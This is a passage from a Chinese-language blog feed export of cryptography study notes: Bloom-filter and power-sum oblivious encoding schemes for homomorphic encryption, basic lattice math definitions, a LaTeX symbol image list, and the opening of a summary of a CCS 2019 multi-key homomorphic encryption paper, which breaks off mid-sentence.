class="math inline">\((f_{p})\)</span>的数量上限较小。特别地，我们使用false-positive率为1/n的BF。因为存在n个BF.Check操作，预计的false positive的数量为1，从切尔诺夫限出发，false positive的数量以<span class="math inline">\(Ω(log𝜆)\)</span>为界，在𝜆中具有压倒性的概率。这表明有<span class="math inline">\(f_{p}=\Omega(log\lambda)\)</span>。<br></p><p>  布隆过滤器B的维数c可以使用如下BF false positive比率方程计算得出：<span class="math inline">\((1-e^{-\frac{\eta s}{c}})^{\eta}\leqslant\frac{1}{n}\)</span><br></p><p>  <span class="math inline">\(c=\eta s·n^{\frac{1}{\eta}}\)</span>满足方程。这一点可以使用<span class="math inline">\(1-e^{-x}\leqslant x,x\in[0,1]\)</span>证实: <span class="math inline">\(1-e^{-\frac{\eta s}{c}}\leqslant\frac{\eta s}{c}=1/n^{1/\eta}\)</span><br></p><p>  <strong>效率。</strong></p><ul><li>编码算法使用<span class="math inline">\(n\eta\)</span>同态加法操作以及<span class="math inline">\(n\eta\)</span>哈希函数。</li><li>编码的维数c为<span class="math inline">\(\eta s·n^{\frac{1}{\eta}}\)</span>。通常设置𝜂在2和32之间。</li><li>解码算法使用n次BF.Check的操作。</li></ul><p>  总的来说，我们已经约简编码大小c为n上的次线性。但是，我们仍然需要约简解码中的BF.Check操作的数量为n上的次线性。我们在下一个构造中证明了如何实现。</p><h2 id="bf-coie">4.2 BF-COIE</h2><p>  我们现在展示如何改进上述构造，实现在时间o(n)内解码。该改进的主要思想是使用布隆过滤器来表示一个二叉搜索树，树的每一层都是一个BF。我们可以指导解码算法避免不包含非零项的解码分支。由于大多数分支可以在达到叶级布隆过滤器之前被截断，这导致了次线性的总成本。<br></p><p>  <strong>例子。</strong>在介绍这个构造的正式协议之前，我们通过一个例子来表达我们的想法。设n=32，假设我们希望编码索引<span class="math inline">\(I=\{1,15,16\}\)</span>。定义<span class="math inline">\(I^{k}=\{\lceil\frac{i}{2^{k}}\rceil:i\in I\}\)</span>。<span class="math inline">\(I^{k}\)</span>中的一个元素i可以看作长度为<span class="math inline">\(2^{k}\)</span>的一个范围<span class="math inline">\([(i-1)·2^{k}+1,i·2^{k}]\)</span>。有：</p><ul><li><span class="math inline">\(I^{4}=\{1\}\)</span></li><li><span class="math inline">\(I^{3}=\{1,2\}\)</span></li><li><span class="math inline">\(I^{2}=\{1,4\}\)</span></li><li><span class="math inline">\(I^{1}=\{1,8\}\)</span></li><li><span class="math inline">\(I^{0}=\{1,15,16\}\)</span></li></ul><p>  现在假设我们将每个集合<span class="math inline">\(I^{k}\)</span>插入到它自己的BF。我们可以通过便利这些BF来解码集合<span class="math inline">\(I\)</span>，如下：<br></p><p>  (1)检查<span class="math inline">\(I^{4}\)</span>的所有可能索引。因为n=32，<span class="math inline">\(I^{4}\)</span>将原始索引除以<span class="math inline">\(2^{4}=16\)</span>，得到这一层的可能索引是1和2。<br></p><p>  在上述例子中，当我们查询<span class="math inline">\(I^{4}\)</span>的BF，只包含索引1，这意味着I中不包含大于16的值。因此我们可以避免在较低级别检查任何这样的索引。<br></p><p>  现在考虑下一级的BF(即<span class="math inline">\(I^{3}\)</span>的BF)。这一层的可能索引为1、2、3、4，但是因为我们已经知道I中没有大于16的值，只需要检查1、2(因为3*8&gt;16).<br></p><p>  (2)检查<span class="math inline">\(I^{3}\)</span>的索引1、2。BF显示索引1、2都存在，这意味着我们要检查<span class="math inline">\(I^{2}\)</span>中的索引1、2和3、4。<br></p><p>  (3)检查<span class="math inline">\(I^{2}\)</span>的索引1、2、3、4。BF显示索引1和4存在，这意味着我们只需要检查<span class="math inline">\(I^{1}\)</span>中的索引1、2和7、8，其他索引可以跳过。<br></p><p>  (4)检查<span class="math inline">\(I^{1}\)</span>的索引1、2、7、8。BF将显示索引1和8存在，这意味着我们需要检查索引1、2和15、16。<br></p><p>  (5)检查<span class="math inline">\(I^{0}\)</span>的索引1、2、15、16，并输出最终索引1、2、15、16。<br></p><p>  现在假设不存在false positives，这种方法在每个层次最多检查<span class="math inline">\(2|I|\)</span>个值，且只有<span class="math inline">\(lg\ n\)</span>个层次。因此，解码算法将检查<span class="math inline">\(O(|I|·lg\ n)\)</span>个索引，这在n上是次线性的。<br></p><p>  <strong>BF-COIE。</strong>现在描述我们的BF-COIE构造。与之前一样，我们将在描述我们的构造后计算出参数。编码算法描述在算法1中。<br></p><p><img src="http://tva1.sinaimg.cn/large/007aD2tWly1gyiq2qbb2lj30o10dz7bi.jpg" /></p><p>  注意上述的步骤(a)到(c)，warm-up构造被用于构造索引<span class="math inline">\(I^{k}\)</span>的BF <span class="math inline">\(B^{k}\)</span>。<br></p><p>  为了约简输出编码的大小，我们设置t为<span class="math inline">\(lg\ \frac{n}{2s}\)</span>而不是<span class="math inline">\(lg\ n\)</span>。注意当t以这种方式设置，<span class="math inline">\(I^{t}\)</span>包含至多<span class="math inline">\(n/2^{t}=2s\)</span>个可能值。<br></p><p>  解码算法描述在算法2中。<br></p><p><img src="http://tva1.sinaimg.cn/large/007aD2tWly1gyir66u6cmj30o10a243g.jpg" /></p><p>  <strong>有用的引理。</strong>下列引理将用于分析参数c和<span class="math inline">\(f_{p}\)</span>。<br></p><p>  <strong>引理4.1</strong> 考虑误报率为1/m的布隆过滤器，其中m是一个任意正整数。假设BF中至多执行m次BF.Check操作。则对任意<span class="math inline">\(δ&gt;0\)</span>，有：<span class="math inline">\(Pr[\#\ false\ positives \ge 1+\delta]\le \frac{e^{\delta}}{(1+\delta)^{1+\delta}}\)</span><br></p><p>  附录A中给出了应用切尔诺夫限的证明。<br></p><p>  关于上述引理，我们注意到设置<span class="math inline">\(\delta=\Omega(log\ \lambda)\)</span>，有<span class="math inline">\(Pr[\sum_{i=1}^{m}{X_{i}\ge 1+\delta}]=negl(\lambda)\)</span><br></p><p>  <strong>参数c和<span class="math inline">\(f_{p}\)</span>。</strong> 我们设置BF-COIE方案的false positive上限<span class="math inline">\(f_{p}:=\Omega(log\ \lambda)\)</span>。在我们的实验中，设置<span class="math inline">\(𝑓_{𝑝}=16\)</span>。<br></p><p>  现在设<span class="math inline">\(m=max(2s,s+2f_{p})\)</span>，设置BF误报率为1/m。回顾一下BF-COIE构造，最上面的BF<span class="math inline">\(B^{t}\)</span>执行2s次BF.Check操作；参见算法2的第(2)行使用上述引理，顶层BF<span class="math inline">\(B^{t}\)</span>的false positives数量至多为<span class="math inline">\(𝑓_{𝑝}\)</span>，以几乎可以忽略不计的概率<span class="math inline">\(λ\)</span>。此外，<span class="math inline">\(B_{t}\)</span>的索引i被展开为<span class="math inline">\(B^{t-1}\)</span>中的两个索引2i-1和2i。这意味着由于<span class="math inline">\(B^{t}\)</span>的false positives，<span class="math inline">\(B^{t-1}\)</span>中检查出的错误索引的数量至多为<span class="math inline">\(2f_{p}\)</span>。<br></p><p>  现在考虑一个属于<span class="math inline">\(B_{t}\)</span>的索引i。算法2将在<span class="math inline">\(B^{t-1}\)</span>的值2i-1和2i运行BF.Check。因为这些值中至少有一个必须属于<span class="math inline">\(B^{t-1}\)</span>，这导致至多一个错误索引被检查出。因此，<span class="math inline">\(B^{t-1}\)</span>中能够检查出的错误索引的最大数量至多为<span class="math inline">\(s+2f_{p}\)</span>(即<span class="math inline">\(2f_{p}\)</span>来自<span class="math inline">\(B_{t}\)</span>的false positives，s来自<span class="math inline">\(B_{t}\)</span>的true positives)。<br></p><p>  上述论点归纳地适用于最底层，这意味着将在每个层次BF <span class="math inline">\(B_{i}\)</span>将检查的最大错误索引数最多为<span class="math inline">\(s+2f_{p}\)</span>。最后，底部BF将有至多<span class="math inline">\(f_{p}\)</span>false positives，以及整体BF-COIE方案将有至多<span class="math inline">\(f_{p}\)</span>false positives，以几乎可以忽略不计的概率<span class="math inline">\(\lambda\)</span>。<br></p><p>  对于compactness参数c，我们必须决定每个BF的维数ℓ。回顾一下，我们设置BF false positive率为1/m，<span class="math inline">\(m=max(2s,s+2f_{p})\)</span>: <span class="math inline">\((1-e^{-\frac{\eta s}{\mathcal{l}}})\)</span>。设置<span class="math inline">\(\mathcal{l}=\eta·s·m^{\frac{1}{\eta}}\)</span>满足上述条件，可以使用不等式<span class="math inline">\(1-e^{-x}\le x\)</span>证明，x∈[0, 1]；<span class="math inline">\(1-e^{-\frac{\eta s}{\mathcal{l}}}\le \frac{\eta s}{\mathcal{l}}=(1/m)^{1/\eta}\)</span>.<br></p><p>  因为编码有t+1 BF，总的compactness参数如下：<span class="math inline">\(c=(t+1)·\mathcal{l}=O(\eta·s^{1+\frac{1}{\eta}}·lg\frac{n}{s})\)</span><br></p><p>  <strong>效率。</strong></p><ul><li>编码的大小c为<span class="math inline">\(O(\eta·s^{1+\frac{1}{\eta}}·lg\frac{n}{s})\)</span>。在我们的实验中，选择ŋ=2。</li><li>编码算法使用<span class="math inline">\(O(\eta·n·lg\frac{n}{s})\)</span>次同态加法操作和哈希函数。</li><li>解码算法使用<span class="math inline">\(O(s\ lg\frac{n}{s})\)</span>次BF.Check操作。</li></ul><p>  总的来说，假设s=o(n)，我们约简编码大小c为n上的次线性。此外，我们也约简BF.Check操作的数量为n上的次线性。<br></p><p>  <strong>备注。</strong>尽管方案中存在乘法BF，编码c的大小要比warm-up方案更小！这是由于BF的乘法层次，我们可以放宽每个BF的false positive率。编码计算次数减少一个乘法参数<span class="math inline">\(lg\frac{n}{s}\)</span>.<br></p><h2 id="基于指数和的coie方案">4.3 基于指数和的COIE方案</h2><p>  <strong>使用指数和代替false positive。</strong>我们提供了另一个编码方案，使用完全不同的技术，可以消除之前构造的false positives。为了实现这一点，我们放弃了布隆过滤器，而是使用指数和编码，就像在使用DC-Nets进行匿名广播的若干工作中所做的那样。<br></p><p>  <strong>PS-COIE。</strong>我们描述了一个基于指数和的COIE方案，称为PS-COIE。与之前一样，我们将在描述构造之后计算参数。编码算法如下。<br></p><p><img src="http://tva1.sinaimg.cn/large/007aD2tWly1gyisyn7174j30o105oac8.jpg" /></p><p>  注意<span class="math inline">\(i^{j}\)</span>的值（模底层明文模数）是公共可计算的，因此计算<span class="math inline">\(i^{j}·[v_{i}]\)</span>只需要标量乘法，而没有同态乘法。<br></p><p>  回顾一下，<span class="math inline">\(v_{i}\in \{0,1\}\)</span>。如果我们设<span class="math inline">\(I=\{i:v_{i}=1\}\)</span>表示非零元素的索引，则<span class="math inline">\(w_{j}=\sum_{i=1}^{n}{i^{j}·v_{i}}=\sum_{i\in I}{i^{j}}\)</span>。因此，<span class="math inline">\(w_{j}\)</span>索引的j次指数和。使用指数和，我们在算法4中展示了使用指数和的解码算法。<br></p><p><img src="http://tva1.sinaimg.cn/large/007aD2tWly1gyit6tpiu0j30o10jhn63.jpg" /></p><p>  <strong>参数c和<span class="math inline">\(f_{p}\)</span>。</strong> COIE方案没有false positives；因此<span class="math inline">\(f_{p}=0\)</span>.compactness参数c等于s。<br></p><p>  <strong>效率。</strong><br></p><ul><li>编码算法使用𝑠·𝑛同态加法操作和标量乘法。</li><li>编码由s个密文组成。</li><li>解码算法在<span class="math inline">\(O(s^{2})\)</span>内计算系数。使用Cantor-Zassenhaus算法，S次多项式的根可以在<span class="math inline">\(O(s^{3}log\ p)\)</span>内找到，其中p是底层FHE的明文模数。</li></ul><h1 id="code方案">5. CODE方案</h1><p>  在之前的章节中，我们展示了COIE方案的两种构造，使用次线性存储对索引向量进行编码。现在我们来看CODE方案的构造，它编码实际的数据值，而不是编码非零项的索引。<br></p><p>  <strong>简化的key-value存储。</strong>为了构造我们的CODE方案，我们首先构造一个辅助数据结构，它支持下列操作：<br></p><ul><li><span class="math inline">\(Init()\)</span>.初始化数据结构。</li><li><span class="math inline">\(Insert(key.value)\)</span>.该操作允许用户基于它的key和values插入项。</li><li><span class="math inline">\(Values()\)</span>.返回插入的所有值。</li></ul><p>  该数据结构要比典型的key-value存储更简单，因为它不需要按key查找单个项。但是注意，这仍然足以满足我们构建CODE方案的目的。</p><h2 id="bf集合">5.1 BF集合</h2><p>  我们现在展示如何使用我们称为布隆过滤器集合（BFS）的数据结构来实例化一个简化的key-value存储，该数据结构基于2.2章中给出的代数布隆过滤器。为了插入一对(key, value)，布隆过滤器集合存储实际值，而不是一个索引比特。与之前类似，通过将值添加到key的哈希所指示的位置来插入项。<br></p><p>  <strong>输入数据格式。</strong>在构造中，我们假定插入数据的格式。具体来说，我们假设所有插入值都包含一个唯一的校验和（例如，一个值的加密哈希）。我们假设该校验和足够长，校验和的一个随机和不会给出一个有效的校验和，以可忽略的概率（λ的一个函数）。<br></p><p>  <strong>构造。</strong>我们首先描述数据结构的构造。下面我们将展示如何选择参数，以便客户能够从这个布隆过滤器中以压倒性的概率提取所有匹配项。<br></p><ul><li><span class="math inline">\(BFS.Init()\to (B,\mathcal{H})\)</span>.创建一个ℓ维向量B，其中每个元素都可以存储域D中任意可能的值。选择ŋ不同哈希函数的一个集合<span class="math inline">\(\mathcal{H}=\{h_{q}:\{0,1\}^{*}\to [\mathcal{l}]\}_{q=1}^{\eta}\)</span>。初始化<span class="math inline">\(B_{i}:=0,i\in[\mathcal{l}]\)</span>.</li><li><span class="math inline">\(BFS.Insert(B,\mathcal{H},key,\alpha)\)</span>.为了插入<span class="math inline">\((key,\alpha)\)</span>，我们将<span class="math inline">\(\alpha\)</span>加到key的哈希所指示的位置的值中。具体地说，对于<span class="math inline">\(q\in[\eta]\)</span>:计算<span class="math inline">\(j=h_{q}(key)\)</span>并设置<span class="math inline">\(B_{j}:=B_{j}+\alpha\)</span>.</li><li><span class="math inline">\(BFS.Values(B)\)</span>.)初始化集合V为空集。对于<span class="math inline">\(j\in[\mathcal{l}]\)</span>，如果<span class="math inline">\(B_{j}\)</span>有一个有效的校验和，则将<span class="math inline">\(B_{j}\)</span>添加到V。最后输出V。</li></ul><p>  我们注意到，正如Goodrich先前提出的那样，可以通过维护一个每个位置插入值的数量的计数器来避免校验和。则BFS.Values只返回计数器为1的位置的值。<br></p><p>  <strong>参数。</strong>我们展示了如何设置布隆过滤器参数，以保证所有值都能以几乎可以忽略的概率恢复。我们假设知道插入值的数量的上界s。引入如下引理。<br></p><p>  <strong>引理5.1</strong> 如果至多s个值被插入到BFS数据结构，则通过设置𝜂和ℓ，有<span class="math inline">\(\mathcal{l}\ge 2(s\eta-1)\)</span> ，我们可以以至少<span class="math inline">\(1-s·(1/2)^{\eta}\)</span>的概率恢复所有s值。<br></p><p>  <strong>证明。</strong>考虑一个(key, value)对<span class="math inline">\((k_{i},\alpha_{i})\)</span>。如果这一对的每一个哈希位置都被另一个插入的键值对占据，那么这一对就会完全冲突。在这种情况下，<span class="math inline">\(\alpha_{i}\)</span>不能被恢复。另一方面，如果至少一个哈希位置没有冲突，则我们可以恢复该值。注意冲突取决于键<span class="math inline">\(𝑘_{i}\)</span>而不是值<span class="math inline">\(\alpha_{i}\)</span>.<br></p><p>  对于给定的键<span class="math inline">\(𝑘_{i}\)</span>，我们定义事件<span class="math inline">\(TCOL(k_{i})\)</span>:<span class="math inline">\(TCOL(k_{i})=1\ if\ \forall q\in[\eta],\exists(k&#39;,q&#39;)\ne(k_{i},q):h_{q}(k_{i})=h_{q&#39;}(k&#39;)\)</span>.这里k'可以是已经插入到集合中的任意项的键。因为集合包含至多s项，存在至多s可能的键k'。ŋ哈希函数被应用于每个项。<br></p><p>  因为对于每个<span class="math inline">\(𝑘_{i}\)</span>，存在至多𝜂𝑠−1对<span class="math inline">\((k&#39;,q&#39;)\)</span>与<span class="math inline">\((k_{i}, q)\)</span>不同，我们可以将冲突概率限制如下：<span class="math inline">\(Pr[TCOL(k_{i})]\le (\frac{(\eta s-1)}{l})^{\eta}\)</span><br></p><p>  因此，如果我们选择𝜂和ℓ，<span class="math inline">\(\mathcal{l}\ge 2(s\eta-1)\)</span>，则<span class="math inline">\(Pr[TCOL(k_{i})]\le (1/2)^{\eta}\)</span>.<br></p><p>  <span class="math inline">\(\mathcal{l}\ge 2(s\eta-1)\)</span>，则<span class="math inline">\(Pr[\exists k_{i}:TCOL(k_{i})]\le (1/2)^{\eta}\)</span>.</p><h2 id="基于bf集合的code方案">5.2 基于BF集合的CODE方案</h2><p>  在本节，我们构造一个CODE方案。回顾一下，不同于COIE方案中对索引进行编码，CODE方案以压缩方式编码数据。我们的构造的主要思想是模拟BFS的操作；称我们的方案为BFS-CODE。<br></p><p>  <strong>预处理输入数据。</strong>正如在描述BF集合构造时提到的，我们需要预处理输入数据，从而使每个项都附有其校验和。尽管数据项v表示为单个数字，假设v可以分解为实际值v.val和校验和v.tag。此外，我们假设校验和足够长，从而校验和的一个随机线性组合产生一个有效校验和的可能性微乎其微(即<span class="math inline">\(|𝑐ℎ𝑒𝑐𝑘𝑠𝑢𝑚|=𝜔(𝜆)\)</span>)。</p><p>  我们强调当我们的CODE方案被用于安全搜索时，在对数据进行加密之前，该预处理可以在客户本地执行。此外，计算校验和仅仅增加很少的开销。<br></p><p>  <strong>BFS-CODE。</strong>现在我们描述域D上的<span class="math inline">\((𝑛,𝑠,𝑐,𝑓_{𝑝})-BFS-CODE\)</span>构造。与之前一样，描述构造后将计算出参数。编码算法如下。<br></p><p><img src="http://tva1.sinaimg.cn/large/007aD2tWly1gyiwldu4v4j30o1091q7v.jpg" /></p><p>  解码算法很简单，描述于算法6。<br></p><p><img src="http://tva1.sinaimg.cn/large/007aD2tWly1gyiwlkjk63j30o103cmyc.jpg" /></p><p>  注意上述步骤4中，如果<span class="math inline">\(v_{i}\)</span>为0，则<span class="math inline">\(B_{j}\)</span>保持不变。另一方面，如果<span class="math inline">\(v_{i}\)</span>不为0，<span class="math inline">\(B_{j}\)</span>将增加<span class="math inline">\(v_{i}\)</span>。这表明B将准确地保存操作<span class="math inline">\(\{BFS.Insert(B,\mathcal{H},i,v_{i}):i\in nzx(v)\}\)</span>的结果。<br></p><p>  <strong>正确性。</strong>这直接来自底层加密方案加法同态和BFS的参数。特别地，我们设置<span class="math inline">\(𝜂=𝜆+lg\ 𝑠\)</span>，从而恢复误差的可能性至多为<span class="math inline">\(2^{λ}\)</span>.<br></p><p>  <strong>参数c和<span class="math inline">\(f_{p}\)</span>。</strong>附加到数据项上的校验和确保我们没有false positives，即<span class="math inline">\(𝑓_{𝑝}=0\)</span>。compactness参数c是BF的维数ℓ，为𝑂(𝜂𝑠)。<br></p><p>  效率。<br></p><ul><li>编码算法使用ℓ=𝑂(𝜂𝑠)加密操作，𝜂·n乘法操作，和𝜂·n哈希函数。</li><li>编码由ℓ密文组成。</li><li>解码算法使用ℓ解密操作。</li></ul><p>  根据引理5.1，布隆过滤器的大小ℓ只依赖于匹配项s的数量和哈希函数𝜂的数量，我们知道，上述协议的通信复杂度与数据库大小n无关。</p>]]></content>
    
    
    <categories>
      
      <category>FHE</category>
      
    </categories>
    
    
    <tags>
      
      <tag>密码学</tag>
      
      <tag>FHE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>基础知识</title>
    <link href="/2022/01/13/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    <url>/2022/01/13/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
    
    <content type="html"><![CDATA[<h1 id="多项式环">多项式环</h1><p>环上的多项式：设R是一个有单位元1的交换环，x是R上的一个未定元，<span class="math inline">\(a_{0},a_{1},a_{2},...,a_{n}∈R\)</span>，称形如<span class="math inline">\(f(x)=a_{0}+a_{1}x+a_{2}x^{2}+...+a_{n}x^{n}\)</span>的表达式为R上x的一个多项式，其中<span class="math inline">\(a_{i}x^{i}\)</span>称为多项式f(x)的i次项，<span class="math inline">\(a_{i}\)</span>称为i次项的系数，如果<span class="math inline">\(a_{n}≠0\)</span>，则称f(x)的次数为n，记作deg f(x)=n。<br><br> 环R上所有关于x的多项式构成的集合记为R[x]。<br><br></p><h1 id="范数">范数</h1><ul><li>1范数<br> 所有元素绝对值的和<br> <span class="math inline">\(||x||_{1}=|x_{1}|+|x_{2}|+...+|x_{n}|\)</span></li><li>2范数<br> 所有元素平方和的开方<br> <span class="math inline">\(||x||_{2}=\sqrt{|x_{1}|^{2}+|x_{2}|^{2}+...+|x_{n}|^{2}}\)</span></li><li>无穷范数<br> 正无穷范数：所有元素中绝对值最大的<br> <span class="math inline">\(||x||_{\infty}=max(|x_{1}|,|x_{2}|,...,|x_{n}|)\)</span><br> 负无穷范数：所有元素中绝对值最小的<br> <span class="math inline">\(||x||_{-\infty}=min(|x_{1}|,|x_{2}|,...,|x_{n}|)\)</span><br></li></ul><h1 id="扩张因子">扩张因子</h1><p>设剩余类环<span class="math inline">\(R=\mathbb{Z}[x]/(f(x)),f(x)∈\mathbb{Z}[x]\)</span>是<span class="math inline">\(\mathbb{Z}\)</span>上的首一多项式，<span class="math inline">\(\forall{u(x),v(x)∈R}\)</span>，称<span class="math inline">\(\gamma=sup\{\frac{||u(x)×v(x)||_{\infty}}{||u(x)||_{\infty}·||v(x)||_{\infty}}:u(x),v(x)∈R\}\)</span>为环R的无穷范数的扩张因子。</p><h1 id="分圆多项式">分圆多项式</h1><p>分圆多项式是指某个n次本原单位根满足的最小次数的首一整系数多项式（必定是不可约多项式）。</p><h1 id="切尔诺夫限">切尔诺夫限</h1><p>https://math.mit.edu/~goemans/18310S15/chernoff-notes.pdf</p>]]></content>
    
    
    <categories>
      
      <category>FHE</category>
      
    </categories>
    
    
    <tags>
      
      <tag>密码学</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>LaTeX常用符号</title>
    <link href="/2022/01/12/LaTeX%E5%B8%B8%E7%94%A8%E7%AC%A6%E5%8F%B7/"/>
    <url>/2022/01/12/LaTeX%E5%B8%B8%E7%94%A8%E7%AC%A6%E5%8F%B7/</url>
    
    <content type="html"><![CDATA[<p><img src="http://tva1.sinaimg.cn/large/007aD2tWly1gyb0hurd7nj30hz05gmzd.jpg" /></p><p><img src="http://tva1.sinaimg.cn/large/007aD2tWly1gyb0iwqbipj30l50b8dkl.jpg" /></p><p><img src="http://tva1.sinaimg.cn/large/007aD2tWly1gyb0j96699j30m70ffagw.jpg" /></p><p><img src="http://tva1.sinaimg.cn/large/007aD2tWly1gyb0jj0iubj30l70cbjwf.jpg" /></p><p><img src="http://tva1.sinaimg.cn/large/007aD2tWly1gyb0jq9b2wj30ka06stb3.jpg" /></p><p><img src="http://tva1.sinaimg.cn/large/007aD2tWly1gyb0jxopg5j30iw0g810m.jpg" /></p><p><img src="http://tva1.sinaimg.cn/large/007aD2tWly1gyb0ke2w2uj30jt08z77k.jpg" /></p><p><img src="http://tva1.sinaimg.cn/large/007aD2tWly1gyb0kml5r6j30hb068dh2.jpg" /></p><p><img src="http://tva1.sinaimg.cn/large/007aD2tWly1gyb0ktjbqoj30pp0bs79c.jpg" /></p><p><img src="http://tva1.sinaimg.cn/large/007aD2tWly1gyb0l2hinaj30nb05pdhi.jpg" /></p><p><img src="http://tva1.sinaimg.cn/large/007aD2tWly1gyb0la0f9mj30kv04wdh4.jpg" /></p><p><img src="http://tva1.sinaimg.cn/large/007aD2tWly1gyb0lg44vdj30mc03b0ts.jpg" /></p><p><img src="http://tva1.sinaimg.cn/large/007aD2tWly1gyb0llz84tj30it0gp7es.jpg" /></p><p><img src="http://tva1.sinaimg.cn/large/007aD2tWly1gyb0ltudk8j30fd0c9jxk.jpg" /></p><p><img src="http://tva1.sinaimg.cn/large/007aD2tWly1gyb0m15qttj30iu0g2129.jpg" /></p><p><img src="http://tva1.sinaimg.cn/large/007aD2tWly1gyb0m7mr72j30gp07pwi6.jpg" /></p><p><img src="http://tva1.sinaimg.cn/large/007aD2tWly1gyb0mcw5zij30i707ztci.jpg" /></p><p><img src="http://tva1.sinaimg.cn/large/007aD2tWly1gyb0mle0q3j30lt07vq7h.jpg" /></p><p>转自：https://blog.csdn.net/Ying_Xu/article/details/51240291</p>]]></content>
    
    
    <categories>
      
      <category>FHE</category>
      
    </categories>
    
    
    <tags>
      
      <tag>密码学</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CCS19</title>
    <link href="/2022/01/12/CCS19/"/>
    <url>/2022/01/12/CCS19/</url>
    
    <content type="html"><![CDATA[<center><big>Efficient Multi-Key Homomorphic Encryption with Packed Ciphertexts with Application to Oblivious Neural Network Inference</big></center><p><br></p><p><strong>摘要</strong><br></p><p>  同态加密（HE）是一个支持对密文数据进行操作的密码系统，lópez-Alt 等人提出了一个广义的HE概念，称为多密钥同态加密（MKHE），能够对不同密钥加密的密文执行算术运算。<br></p><p>  在本论文中，我们提出了两种基于压缩密文的多密钥HE方案变体。给出了新的重新线性化算法，比之前等人的方案更简单、更快。然后我们概况了HE的自举性技术，以得到多密钥全同态加密方案。使用Microsoft SEAL提供了两个MKHE方案的概念验证实现。例如，当基环的维数为8192时，与四方相关联的多密钥BGV密文之间的同态乘法以及随后的重新线性化大约用时116毫秒。<br></p><p>  我们的MKHE方案在多个数据提供者之间的安全计算中有着广泛的应用，作为基准，我们使用预训练的卷积神经网络模型对图像进行同态分类，其中输入数据和模型使用了不同的密钥进行加密。我们需要大约1.8秒来实现对MNIST数据集中一个加密图像的一个卷积层和两个完全连接的层的评估。</p><h1 id="介绍">1. 介绍</h1><p>  推动新的科学发现产生和使用了大量数据，有效并负责任地利用大数据仍然是一个巨大的挑战。这个问题可以通过外包给拥有密集计算资源的公共云服务提供商来缓解。但是，在外包数据分析的隐私和安全性方面仍然存在问题。在过去几年里，用于安全计算的密码技术已经取得了重大进展。在安全计算方面的技术中，多方计算（MPC）和同态加密（HE）由于技术上的突破而受到了越来越多的关注。<br></p><p>  MPC的历史可以追溯到三十年前，从那时起理论界就对其进行了深入研究。在多方计算中，两个或多个参与方参与协议交互，来对输入的私有数据进行计算，只有函数的输出会显示给参与方。近年来，人们在提高MPC的实际效率方面进行了大量的工作，最先进的协议在性能方面取得了数量级的改进。但是就通信复杂度而言，这些协议本质上仍然是低效的：协议期间，参与各方需要交换的比特数与函数的复杂性和参与方数目之间的乘积成正比。因此，高通信复杂度仍然是MPC协议的主要瓶颈。<br></p><p>  此外，上述MPC协议对于基于云的应用程序可能并不可取，因为所有相关方都需要执行与功能复杂性成比例的本地计算。但是在实际中，我们不能期望数据提供者在整个协议执行期间执行大量的工作或一直保持在线。因此提出了另一种模型，其中数据所有者与少量独立服务器私密地共享数据，这些服务器再执行MPC来生成计算结果。这些协议具有良好的性能，它们将负担从数据提供者转移到了服务器，但是它们的隐私保证依赖于服务器不相互串通的假设。<br></p><p>  HE指的是一种密码系统，允许在加密数据上进行计算，而无需解密数据，从而能够在不受信任的云中安全地外包计算。在Gentry首次构造后（基于理想格的全同态加密方案），HE的技术有了重大进步。例如，可以将多个明文值加密为单个压缩密文，并使用单指令多数据技术（SIMD）对这些值并行执行操作。因此，具有压缩技术的HE方案的每个明文值具有良好的摊销复杂度，并且已经被应用在隐私保护的大数据分析中。但是，传统的HE方案只允许计算同一密钥下可进行解密的密文。因此，HE并不支持存在多个数据提供者的安全计算应用程序，每个数据提供者都提供自己的密钥。<br></p><p>  lópez-Alt 等人提出了一种MKHE方案，它是一种密码原语，支持密文上的算术运算，而密文不要求需要使用同一密钥解密。除了解决上述HE的问题外，MKHE还可用于以最小的通信成本设计高效的MPC协议。此外，基于MKHE的MPC协议满足动态MPC属性，其中待评估的电路可以在数据提供者上传其加密数据后动态决定。<br></p><p>  尽管MKHE具有多功能性，但在实践中很少使用。早期的研究使用了GSW方案的多密钥变体。这些结构具有较大的密文，且它们的性能不能很好地随参与方的数量而扩展。以前的工作提出了短密文的MKHE方案，并警告一个密文只加密一个比特位。现在唯一的具有压缩密文的MKHE方案是BGV方案的多密钥变体。请注意，上述所有研究都是纯粹抽象的，没有给出实现，支持SIMD操作的MKHE方案是否可行仍然是一个悬而未决的问题。</p><h2 id="贡献">1.1 贡献</h2><p>  我们设计了BFV和CKKS方案的多密钥变体。提出了一种新的生成重新线性化密钥的方法，该方法比以前的技术更简单、更快。此外，我们将这些方案的最新自举算法应用于多密钥场景，以构建具有压缩密文的多密钥全同态加密。最后，我们给出了使用Microsoft SEAL实现的多密钥方案的概念证明，并给出了实验结果。据我们所知，这是第一个支持压缩密文的MKHE方案的实际实现。<br></p><p>  我们还提出了第一个可行的MKHE应用，能够安全地评估一个预训练卷积神经网络（CNN）模型。我们构造了一个高效的协议，其中云服务器使用模型提供者提供的分类器向数据所有者提供在线预测服务，同时使用MKHE保护数据和模型的隐私。我们的方案支持多密钥操作，因此可以在较低的端到端延迟下实现这一点，并且数据和模型提供者的成本接近最优（如图Fig.1）。服务器可以存储不同密钥加密的大量密文，但特定任务的计算成本仅取决于与电路相关的参与方的数量。我们注意到，我们的解决方案比单密钥HE具有优势， 因为ML模型提供者不需要将未加密的模型发送到服务器。</p><p><img src="http://tva1.sinaimg.cn/large/007aD2tWly1gyayrs3t5vj30o108twgv.jpg" /></p><h2 id="构造概述">1.2 构造概述</h2><p>  设分圆环<span class="math inline">\(R=\mathbb{Z}[X]/(x^{n}+1)\)</span>，<span class="math inline">\(s_{i}∈R\)</span>是第i方的秘密，构造基于环的MKHE方案的出发点是要求生成的方案能够在独立生成的密钥下处理密文上的同态计算。与K个不同方相关联的MKHE方案的密文形式为<span class="math inline">\(\overline{ct}=(c_{0},c_{1},...,c_{k})∈R_{q}^{k+1}\)</span>，其中模数q可以由级联的密钥<span class="math inline">\(\overline{sk}=(1,s_{1},...,s_{k})\)</span>解密。换句话说，其相位<span class="math inline">\(μ=&lt;\overline{ck},\overline{sk}&gt;(mod\ q)\)</span>是对应于基本方案的密文消息m的随机编码。<br></p><p>  BFV或CKKS的同态乘法包含两个步骤：张量积与再线性化。两个输入密文的张量积满足<span class="math 